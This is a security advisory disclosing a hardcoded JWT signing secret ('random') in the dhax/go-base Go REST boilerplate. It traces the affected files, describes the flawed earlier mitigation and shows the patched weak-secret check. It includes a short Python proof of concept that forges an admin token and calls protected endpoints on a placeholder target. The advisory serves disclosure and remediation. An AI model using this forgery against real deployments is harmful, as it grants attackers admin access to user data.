# [C] Go Restful API Boilerplate: Hardcoded JWT Secret "random" Allows Token Forgery

## Summary
Severity: Critical
Advisory: GHSA-mqq6-462x-jxmm
CVE: CVE-2026-48031
CWE: CWE-798
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-06-10
Source: https://github.com/advisories/GHSA-mqq6-462x-jxmm
Type: github-advisory

## Affected
- Go: `github.com/dhax/go-base` — affected >=0 <0.0.0-20260517152733-cc82b9740fa6

## Details
## Vulnerability: CWE-798 — Hardcoded JWT Secret + Broken Mitigation

### Affected Component
- `github.com/dhax/go-base` — Go REST API boilerplate (go-chi/jwtauth/v5, Viper, PostgreSQL/Bun)
- 1,685 stars on GitHub

### Vulnerability Locations

| File | Line | Role |
|------|------|------|
| `dev.env` | 10 | `AUTH_JWT_SECRET=random` — template default shipped to all users |
| `cmd/serve.go` | 35 | `viper.SetDefault("auth_jwt_secret", "random")` — code-level fallback |
| `auth/jwt/tokenauth.go` | 22-25 | Weak mitigation: only checked literal `"random"`, auto-generated non-persistent key |
| `auth/jwt/tokenauth.go` | 28 | `jwtauth.New("HS256", []byte(secret), nil)` — creates JWT signer with the weak key |
| `pwdless/api.go` | 203 | `GenTokenPair()` — issues access + refresh tokens signed with the weak key |

### Data Flow

```
dev.env AUTH_JWT_SECRET=random
  OR
cmd/serve.go viper.SetDefault("auth_jwt_secret", "random")
    │
    ▼
auth/jwt/tokenauth.go: viper.GetString("auth_jwt_secret")
    │
    ▼
auth/jwt/tokenauth.go: jwtauth.New("HS256", []byte(secret), nil)
    │
    ▼
pwdless/api.go: GenTokenPair() → access + refresh tokens
    │
    ▼
jwt/authenticator.go: Every authenticated request trusts the forged token
```

### Description

The JWT signing secret is hardcoded to the string `"random"` in **two independent locations**:

1. **`dev.env:10`** — The template `.env` file sets `AUTH_JWT_SECRET=random`. Every developer who copies this template gets the same default.

2. **`cmd/serve.go:35`** — `viper.SetDefault("auth_jwt_secret", "random")` provides a programmatic fallback. Even if the `.env` file is missing entirely, the application silently starts with `"random"` as the signing key.

The original code contained a mitigation in `auth/jwt/tokenauth.go:22-25` that checked if the secret equaled `"random"` and replaced it with a randomly-generated 32-byte string. This mitigation had **two fatal flaws**:

- **(a) Single-value check**: Only the exact string `"random"` was caught. Any other weak secret (e.g., `"secret"`, `"changeme"`, empty string) passed through unchecked.
- **(b) Non-persistent replacement**: The auto-generated key was stored only in memory (`randStringBytes(32)`), not persisted. On **every restart**, all existing tokens became invalid without warning, breaking all active user sessions. This made the "fix" itself a denial-of-service.

An attacker who reads the public repository knows the signing key is `"random"`. They can forge JWT tokens for arbitrary users (including admin roles), gaining complete authentication bypass on all protected API endpoints.

### Proof of Concept

```python
import jwt
import requests

# The hardcoded secret from dev.env / serve.go (public repository)
SECRET = "random"
BASE_URL = "http://target:3000"

# Step 1: Forge an admin JWT token
payload = {
    "sub": "admin@example.com",
    "roles": ["admin"],
    "iat": 9999999000,
    "exp": 9999999999
}
forged_token = jwt.encode(payload, SECRET, algorithm="HS256")

# Step 2: Access any protected endpoint with the forged token
headers = {"Authorization": f"Bearer {forged_token}"}

# List all users (requires admin)
r = requests.get(f"{BASE_URL}/api/v1/admin/users", headers=headers)
print(f"Status: {r.status_code}")  # 200 OK

# Access own profile with forged identity
r = requests.get(f"{BASE_URL}/api/v1/me", headers=headers)
print(f"Profile: {r.json()}")  # Returns admin@example.com profile

# The forged token is also accepted by refresh endpoints
r = requests.post(f"{BASE_URL}/api/v1/token/refresh", headers=headers)
# Returns a new valid token signed with the same "random" secret
```

### Impact

- **Authentication Bypass**: Forge tokens for any user, including admin roles
- **Confidentiality**: Access all user data, profiles, and protected resources
- **Integrity**: Modify any data accessible via the API
- **Persistence**: Forged tokens remain valid until expiry (or indefinitely via refresh)

### Fix (PR #31)

The fix replaced the single-value check with a comprehensive approach:

```go
// BEFORE (tokenauth.go:22-25) — weak, single-value check
if secret == "random" {
    secret = randStringBytes(32) // non-persistent, breaks on restart
}

// AFTER — comprehensive known-weak-secrets map
var knownWeakSecrets = map[string]bool{
    "random": true,
    "secret": true,
    "changeme": true,
    "change-me": true,
    "default": true,
    "": true,
}

if knownWeakSecrets[secret] {
    log.Fatal("JWT secret is a known weak value. Please set a strong AUTH_JWT_SECRET.")
}
```

Plus: minimum 32-character length check, removal of non-persistent auto-generation, and clear generation instructions (`openssl rand -base64 32`) in the template.

### Patched Versions

- All versions after commit range including PR#31 (merged May 17, 2026).
- Users should update to the latest master, regenerate their JWT secret, and restart.

### Resources

- Fix PR: https://github.com/dhax/go-base/pull/31
- Commit history: https://github.com/dhax/go-base/commits/master

### Credit

Reported by @saaa99999999 via manual security audit.

## References
- https://github.com/dhax/go-base/security/advisories/GHSA-mqq6-462x-jxmm
- https://github.com/dhax/go-base/commit/cc82b9740fa6b08e0fad409cd4b418e240dd0e00
- https://github.com/dhax/go-base
